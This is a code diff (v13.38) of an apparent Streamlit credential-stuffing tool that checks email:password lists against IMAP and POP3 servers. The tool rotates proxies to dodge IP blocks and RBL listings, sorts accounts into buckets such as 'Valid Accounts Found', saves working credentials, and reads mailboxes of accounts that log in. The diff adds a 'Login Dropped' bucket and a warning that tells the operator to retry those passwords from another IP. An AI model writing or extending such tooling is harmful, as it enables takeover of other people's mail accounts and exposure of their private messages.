+                            # FIX v13.38: do NOT return early on a * BYE - POP3,
+                            # the other hosts and the fallback rungs still get
+                            # their turn.  A clean NO elsewhere outranks it.
+                            elif st_val == LOGIN_DROPPED:
+                                server_level_fail = True
+                                rotate_now = False
+                                trace_logs.append(
+                                    f"{px_tag(px_used)} LOGIN_DROPPED on {server}:{port} -> advancing "
+                                    f"the ladder (POP3 / other hosts still get a turn)")
                             else:
                                 server_level_fail = True
                                 if (st_val == FAILED and retries_by_host.get(server, 0) < same_host_retries
@@ -6905,6 +7094,15 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                             trace_logs.append(f"{px_tag(px_used)} -> FAILED {proto} {server}:{port}: {err_text[:140]} [Classified: {st_val}]")
                             note_verdict(st_val, f"{proto} {server}:{port} -> {st_val}", server)
 
+                            # FIX v13.38: mirror the * BYE handling on the generic
+                            # path (a non-imaplib wrapper can surface it here).
+                            if st_val == LOGIN_DROPPED:
+                                flags["saw_login_drop"] = True
+                                trace_logs.append(
+                                    f"{px_tag(px_used)} Server ANSWERED then closed the socket "
+                                    f"(* BYE) on {proto} {server}:{port} -> server-side, "
+                                    f"password still untested; continuing the ladder")
+
                             if st_val == APP:
                                 xres = try_ms_xoauth2(server, px_used, attempt_to, err_text)
                                 if xres:
@@ -6930,7 +7128,8 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                             elif st_val == RBL:
                                 trace_logs.append(f"{px_tag(px_used)} RBL block on {server}:{port} -> IP flagged by server, advancing")
                                 server_level_fail = True
-                            elif u_idx + 1 < len(users) and st_val in (WRONG, UNKNOWN):
+                            # FIX v13.38
+                            elif u_idx + 1 < len(users) and st_val in (WRONG, UNKNOWN, LOGIN_DROPPED):
                                 flags["saw_server"] = True
                                 px_used, _ok = _rotate_to_fresh(px_used, seen_px, "local-part retry", keep_node=True)
                                 trace_logs.append(f"{px_tag(px_used)} Rejected as '{user}' -> retrying same host as local-part '{users[u_idx + 1]}'")
@@ -6946,6 +7145,13 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                                     f"{px_tag(px_used)} WRONG on {'local' if server in domain_local_hosts else 'FOREIGN'} host {server} "
                                     f"-> noted ({best_verdict['status'] or 'none'} retained), continuing")
                                 server_level_fail = True
+                            # FIX v13.38
+                            elif st_val == LOGIN_DROPPED:
+                                server_level_fail = True
+                                rotate_now = False
+                                trace_logs.append(
+                                    f"{px_tag(px_used)} LOGIN_DROPPED on {server}:{port} -> advancing "
+                                    f"the ladder (POP3 / other hosts still get a turn)")
                             else:
                                 server_level_fail = True
                                 rotate_now = rotate_now or proxy_level
@@ -7115,6 +7321,10 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                 f"{domain}. It may belong to a different provider.")
         if best_verdict["status"] == WRONG:
             detail = detail + _wrong_detail_note(domain, password)
+        # FIX v13.38: give the * BYE its own honest readout instead of the raw
+        # rung string, and say plainly that the password was never tested.
+        if best_verdict["status"] == LOGIN_DROPPED:
+            detail = f"{detail} | " + _login_dropped_detail()
         trace_logs.append(
             f"Ladder exhausted with no live answer -> returning retained verdict [{best_verdict['status']}].")
         return None, best_verdict["status"], detail, None, trace_logs
@@ -7137,6 +7347,13 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         return None, RETRY, "retryable (proxy / IP-block / rate-limit)", None, trace_logs
     if not dns_ok:
         return None, DNS_FAILED, "Fast-fail DNS check failed: no host resolves locally", None, trace_logs
+    # FIX v13.38: explicit fallback for a * BYE.  Normally the retained-verdict
+    # block above catches it; this is the belt-and-braces path.
+    if flags.get("saw_login_drop"):
+        trace_logs.append(
+            "Mail host answered, accepted the LOGIN command, then closed the socket "
+            "(* BYE) before returning a verdict - server-side drop, not a network fault.")
+        return None, LOGIN_DROPPED, _login_dropped_detail(), None, trace_logs
     # v13.36: the host answered and LOGIN was issued, but the server dropped it.
     # That is a SERVER-side verdict, not "hosts unreachable".
     if flags.get("saw_server"):
@@ -7159,6 +7376,7 @@ RESULT_ACTION_MODES = [
     ("✅ Valid Found", "valid_results"),
     ("❌ Wrong Password Found", "wrong_results"),
     ("🔐 App Password / 2FA Found", "need_app_results"),
+    ("🚪 Login Dropped (* BYE) Found", "login_drop_results"),   # FIX v13.38
     ("🕓 RETRY_LATER Found", "retry_results"),
     ("🚫 RBL Blocked Found", "rbl_results"),
     ("🔌 Connection Failed Found", "conn_results"),
@@ -7314,6 +7532,7 @@ if start_engine_btn:
             str_lit.session_state.need_app_results = []
             str_lit.session_state.conn_results = []
             str_lit.session_state.proxy_results = []
+            str_lit.session_state.login_drop_results = []     # FIX v13.38
             str_lit.session_state.retry_results = []
             str_lit.session_state.rbl_results = []
             str_lit.session_state.smtp_results = list(str_lit.session_state.get("pre_smtp_failed", []))
@@ -7325,16 +7544,7 @@ if start_engine_btn:
             str_lit.session_state.checked_emails_set = set()
             str_lit.session_state.last_checked_index = 0
             str_lit.session_state.engine_has_run = True
-            # FIX: was a bare expression statement; the next block (pasted from a
-            # chat message) resumed at this same indent, so the prose line between
-            # the two halves broke the compile.  Now a real assignment.
             str_lit.session_state.run_completion_status = "Unfinished"
-
-            # FIX: this used to be raw chat text pasted into the file:
-            #   Continuing the v13.37 app.py from exactly where the last block stopped
-            #   (inside the run reset). Paste this directly beneath it — the two pieces
-            #   concatenate with no seam.
-            # FIX: the ```python markdown fence that followed it is now removed.
 
             start_dt = datetime.now()
             str_lit.session_state.start_timestamp = start_dt.strftime("%Y-%m-%d %H:%M:%S")
@@ -7350,6 +7560,7 @@ if start_engine_btn:
             BUCKET_SPEC = [
                 ("valid_results", "✅ Valid Accounts Found"),
                 ("wrong_results", "❌ Wrong Password Found"),
+                ("login_drop_results", "🚪 Login Dropped (* BYE)"),   # FIX v13.38
                 ("conn_results", "🔌 Connection Failed Found"),
                 ("proxy_results", "🩹 Proxy Unhealthy Found"),
                 ("need_app_results", "🔐 App Password / 2FA Found"),
@@ -7387,6 +7598,7 @@ if start_engine_btn:
                         "valid_results": "VALID", "wrong_results": "WRONG_PASSWORD",
                         "conn_results": "CONNECTION_FAILED", "proxy_results": "PROXY_UNHEALTHY",
                         "need_app_results": "NEED_APP_PASSWORD",
+                        "login_drop_results": "LOGIN_DROPPED",           # FIX v13.38
                         "retry_results": "RETRY_LATER", "rbl_results": "RBL_BLOCKED",
                         "smtp_results": "SMTP_FAILED", "dns_results": "DNS_FAILED",
                         "skip_results": "SKIPPED", "unknown_results": "UNCLASSIFIED",
@@ -7459,6 +7671,10 @@ if start_engine_btn:
                                     str_lit.session_state.wrong_results.append(res["line"])
                                 elif st_val == APP:
                                     str_lit.session_state.need_app_results.append(res["line"])
+                                # FIX v13.38: the * BYE bucket - it exists now,
+                                # so this is no longer dead code.
+                                elif st_val == LOGIN_DROPPED:
+                                    str_lit.session_state.login_drop_results.append(res["line"])
                                 elif st_val == RETRY:
                                     str_lit.session_state.retry_results.append(res["line"])
                                 elif st_val == RBL:
@@ -7493,6 +7709,7 @@ if start_engine_btn:
                                 valid_len = len(str_lit.session_state.valid_results)
                                 wrong_len = len(str_lit.session_state.wrong_results)
                                 need_len = len(str_lit.session_state.need_app_results)
+                                login_drop_len = len(str_lit.session_state.login_drop_results)   # FIX v13.38
                                 conn_len = len(str_lit.session_state.conn_results)
                                 proxy_len = len(str_lit.session_state.proxy_results)
                                 retry_len = len(str_lit.session_state.retry_results)
@@ -7507,6 +7724,7 @@ if start_engine_btn:
                                     "wrong_results": list(str_lit.session_state.wrong_results),
                                     "conn_results": list(str_lit.session_state.conn_results),
                                     "proxy_results": list(str_lit.session_state.proxy_results),
+                                    "login_drop_results": list(str_lit.session_state.login_drop_results),
                                     "need_app_results": list(str_lit.session_state.need_app_results),
                                     "retry_results": list(str_lit.session_state.retry_results),
                                     "rbl_results": list(str_lit.session_state.rbl_results),
@@ -7537,13 +7755,15 @@ if start_engine_btn:
                                     m_row1[3].metric("🔌 Conn Failed", conn_len)
                                     m_row1[4].metric("🩹 Proxy Dead", proxy_len)
                                     m_row1[5].metric("🕓 RETRY_LATER", retry_len)
-                                    m_row2 = str_lit.columns(6)
-                                    m_row2[0].metric("🚫 RBL", rbl_len)
-                                    m_row2[1].metric("📮 SMTP Failed", smtp_len)
-                                    m_row2[2].metric("⏭ Skipped", skip_len)
-                                    m_row2[3].metric("❓ Unclassified", unknown_len)
-                                    m_row2[4].metric("📋 Checked", checked_count)
-                                    m_row2[5].metric("📚 Queue", total_accs)
+                                    # FIX v13.38: 7 columns now, to seat Login Dropped
+                                    m_row2 = str_lit.columns(7)
+                                    m_row2[0].metric("🚪 Login Dropped", login_drop_len)
+                                    m_row2[1].metric("🚫 RBL", rbl_len)
+                                    m_row2[2].metric("📮 SMTP Failed", smtp_len)
+                                    m_row2[3].metric("⏭ Skipped", skip_len)
+                                    m_row2[4].metric("❓ Unclassified", unknown_len)
+                                    m_row2[5].metric("📋 Checked", checked_count)
+                                    m_row2[6].metric("📚 Queue", total_accs)
 
                                 render_buckets(bucket_snapshot)
                                 report_log_container.dataframe(pd.DataFrame(current_reports[::-1]), use_container_width=True, height=320)
@@ -7586,7 +7806,8 @@ if start_engine_btn:
                         w_len = len(str_lit.session_state.wrong_results)
                         rt_len = len(str_lit.session_state.retry_results)
                         px_len = len(str_lit.session_state.proxy_results)
-                    status_text.text(f"Progress: {checked_count}/{total_accs} | Valid: {v_len} | Wrong: {w_len} | Proxy Dead: {px_len} | RETRY_LATER: {rt_len}")
+                        ld_len = len(str_lit.session_state.login_drop_results)
+                    status_text.text(f"Progress: {checked_count}/{total_accs} | Valid: {v_len} | Wrong: {w_len} | Login Dropped: {ld_len} | Proxy Dead: {px_len} | RETRY_LATER: {rt_len}")
 
         except MemoryError as me:
             run_interrupted = True
@@ -7601,15 +7822,25 @@ if start_engine_btn:
             detected_stop_reason = f"Network Connection Failure: {net_err}"
             str_lit.error(f"⚠ Engine Stopped: {detected_stop_reason}")
         except BaseException as be:
-            run_interrupted = True
+            # FIX v13.38: SystemExit/KeyboardInterrupt propagate FIRST, then
+            # Streamlit's RerunException/StopException (BaseException subclasses,
+            # NOT Exception) get their own honest label instead of falling into
+            # the generic branch.
             if isinstance(be, (SystemExit, KeyboardInterrupt)):
+                run_interrupted = True
                 detected_stop_reason = "System Shutdown / Interruption"
                 raise be
-            be_str = str(be).lower()
-            if any(k in be_str for k in ["rerun", "stop", "scriptrunner", "websocket", "closed", "connection lost"]) or type(be).__name__ in ["RerunException", "StopException", "ScriptStopped"]:
-                detected_stop_reason = "User Interruption: UI interaction"
+            run_interrupted = True
+            _bn = type(be).__name__
+            if _bn in ("RerunException", "StopException", "ScriptStopped"):
+                detected_stop_reason = "User Interruption: UI interaction (Streamlit rerun)"
+                log_probe_event("run stopped by a Streamlit RerunException/StopException")
             else:
-                detected_stop_reason = f"Unexpected Error / Interruption: {be}"
+                be_str = str(be).lower()
+                if any(k in be_str for k in ["rerun", "stop", "scriptrunner", "websocket", "closed", "connection lost"]):
+                    detected_stop_reason = "User Interruption: UI interaction"
+                else:
+                    detected_stop_reason = f"Unexpected Error / Interruption: {be}"
         finally:
             STATE["run_active"] = False
             with session_state_lock:
@@ -7631,6 +7862,7 @@ if start_engine_btn:
             valid_snapshot = list(str_lit.session_state.valid_results)
             wrong_snapshot = list(str_lit.session_state.wrong_results)
             need_snapshot = list(str_lit.session_state.need_app_results)
+            login_drop_snapshot = list(str_lit.session_state.login_drop_results)   # FIX v13.38
             conn_snapshot = list(str_lit.session_state.conn_results)
             proxy_snapshot = list(str_lit.session_state.proxy_results)
             retry_snapshot = list(str_lit.session_state.retry_results)
@@ -7652,6 +7884,7 @@ if start_engine_btn:
             need_path = os.path.join(CFG["RESULTS_DIR"], f"need_app_{stamp}.txt")
             failed_path = os.path.join(CFG["RESULTS_DIR"], f"failed_{stamp}.txt")
             proxy_path = os.path.join(CFG["RESULTS_DIR"], f"proxy_unhealthy_{stamp}.txt")
+            login_drop_path = os.path.join(CFG["RESULTS_DIR"], f"login_dropped_{stamp}.txt")   # FIX v13.38
             retry_path = os.path.join(CFG["RESULTS_DIR"], f"retry_later_{stamp}.txt")
             rbl_path = os.path.join(CFG["RESULTS_DIR"], f"rbl_blocked_{stamp}.txt")
             smtp_path = os.path.join(CFG["RESULTS_DIR"], f"smtp_failed_{stamp}.txt")
@@ -7666,7 +7899,9 @@ if start_engine_btn:
             hdr = f"# Started: {str_lit.session_state.start_timestamp} | Ended: {str_lit.session_state.end_timestamp} | Duration: {str_lit.session_state.total_duration} | Protocols: {'+'.join(active_protocols())}\n"
             with file_write_lock:
                 for path, snap in ((valid_path, valid_snapshot), (wrong_path, wrong_snapshot),
-                                   (need_path, need_snapshot), (failed_path, conn_snapshot),
+                                   (need_path, need_snapshot),
+                                   (login_drop_path, login_drop_snapshot),   # FIX v13.38
+                                   (failed_path, conn_snapshot),
                                    (proxy_path, proxy_snapshot),
                                    (retry_path, retry_snapshot), (rbl_path, rbl_snapshot),
                                    (smtp_path, smtp_snapshot), (dns_path, dns_snapshot),
@@ -7685,6 +7920,7 @@ if start_engine_btn:
                 for p, arc in ((clean_valid_path, "valid_email_password.txt"),
                                (wrong_path, os.path.basename(wrong_path)),
                                (need_path, os.path.basename(need_path)),
+                               (login_drop_path, os.path.basename(login_drop_path)),   # FIX v13.38
                                (failed_path, os.path.basename(failed_path)),
                                (proxy_path, os.path.basename(proxy_path)),
                                (retry_path, os.path.basename(retry_path)),
@@ -7721,6 +7957,7 @@ if str_lit.session_state.engine_has_run or load_persistent_valid_results():
         clean_count_val = str_lit.session_state.get("run_valid_count", str_lit.session_state.clean_valid_count)
         wrong_len_val = len(str_lit.session_state.wrong_results)
         need_len_val = len(str_lit.session_state.need_app_results)
+        login_drop_len_val = len(str_lit.session_state.login_drop_results)   # FIX v13.38
         conn_len_val = len(str_lit.session_state.conn_results)
         proxy_len_val = len(str_lit.session_state.proxy_results)
         retry_len_val = len(str_lit.session_state.retry_results)
@@ -7740,6 +7977,8 @@ if str_lit.session_state.engine_has_run or load_persistent_valid_results():
         summary_buckets = {
             "✅ Valid Accounts Found": list(str_lit.session_state.valid_results),
             "❌ Wrong Password Found": list(str_lit.session_state.wrong_results),
+            "🚪 Login Dropped (* BYE) — server answered, password untested":
+                list(str_lit.session_state.login_drop_results),                 # FIX v13.38
             "🔌 Connection Failed Found": list(str_lit.session_state.conn_results),
             "🩹 Proxy Unhealthy Found": list(str_lit.session_state.proxy_results),
             "🔐 App Password / 2FA Found": list(str_lit.session_state.need_app_results),
@@ -7776,16 +8015,26 @@ if str_lit.session_state.engine_has_run or load_persistent_valid_results():
     c_row1[3].metric("🔌 Connection Failed", conn_len_val)
     c_row1[4].metric("🩹 Proxy Unhealthy", proxy_len_val)
     c_row1[5].metric("🚫 RBL Blocked", rbl_len_val)
-    c_row2 = str_lit.columns(6)
-    c_row2[0].metric("🕓 RETRY_LATER", retry_len_val)
-    c_row2[1].metric("🛰 DNS Failed", dns_len_val)
-    c_row2[2].metric("📮 SMTP Failed", smtp_len_val)
-    c_row2[3].metric("⏭ Skipped", skip_len_val)
-    c_row2[4].metric("❓ Unclassified", unknown_len_val)
-    c_row2[5].metric("📚 Accounts In Buckets",
-                     clean_count_val + wrong_len_val + need_len_val + conn_len_val +
-                     proxy_len_val + rbl_len_val + retry_len_val + skip_len_val + unknown_len_val)
+    # FIX v13.38: 7 columns so Login Dropped has a seat
+    c_row2 = str_lit.columns(7)
+    c_row2[0].metric("🚪 Login Dropped", login_drop_len_val)
+    c_row2[1].metric("🕓 RETRY_LATER", retry_len_val)
+    c_row2[2].metric("🛰 DNS Failed", dns_len_val)
+    c_row2[3].metric("📮 SMTP Failed", smtp_len_val)
+    c_row2[4].metric("⏭ Skipped", skip_len_val)
+    c_row2[5].metric("❓ Unclassified", unknown_len_val)
+    c_row2[6].metric("📚 Accounts In Buckets",
+                     clean_count_val + wrong_len_val + need_len_val + login_drop_len_val +
+                     conn_len_val + proxy_len_val + rbl_len_val + retry_len_val + skip_len_val +
+                     unknown_len_val)
 
+    if login_drop_len_val:
+        str_lit.warning(
+            f"🚪 **{login_drop_len_val} account(s) hit a LOGIN DROP** — the mail server ANSWERED, "
+            f"accepted the LOGIN command and then closed the socket (* BYE). These passwords are "
+            f"still UNTESTED: it is usually a rejected password or an app-password requirement, "
+            f"so retry them from a different IP (or with an app password) before discarding them."
+        )
     if proxy_len_val:
         str_lit.warning(
             f"🩹 **{proxy_len_val} account(s) never reached a mailbox** — every attempt died with "
@@ -7861,9 +8110,6 @@ else:
                         for srv in imap_hosts:
                             msgs = read_mailbox_messages(acc_email, acc_pass, srv, proxy_str=mailbox_proxy, limit=max_msgs)
                             if msgs and not any("Error reading mailbox" in m for m in msgs):
-                                # v13.37: this used to set success_msgs, which
-                                # nothing ever read - so `if success_read:` was
-                                # always False and EVERY successful read warned.
                                 fetched_msgs, success_read = msgs, True
                                 break
                             elif msgs:
